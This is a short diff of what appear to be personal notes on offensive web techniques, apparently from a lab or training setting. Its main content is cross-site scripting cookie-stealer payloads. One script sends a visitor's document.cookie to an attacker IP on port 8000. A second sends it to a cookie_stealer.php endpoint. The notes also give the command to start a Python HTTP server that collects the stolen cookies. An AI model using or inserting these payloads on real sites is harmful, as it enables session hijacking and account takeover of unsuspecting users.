@@ -16,10 +16,10 @@ Scraping Data, html
   print ('Results: ',results)
   
 
-HTTP Cookie Stealer (Java script):
-  <script>document.location="http://10.50.38.82:8000/"+document.cookie;</script>
+
  run on opstation: 
-  python3 -m http.server
+  python3 -m http.server using   <script>document.location="http://10.50.38.82:8000/"+document.cookie;</script>
+
 
 
 
@@ -30,3 +30,6 @@ fwrite($steal, $cookie ."\n");
 fclose($steal);
 ?>
 (Cookie_Stealer.php)
+
+using      <script>document.location="http://serveripport/uploads/cookie_stealer.php?username="+document.cookie;</script>
+
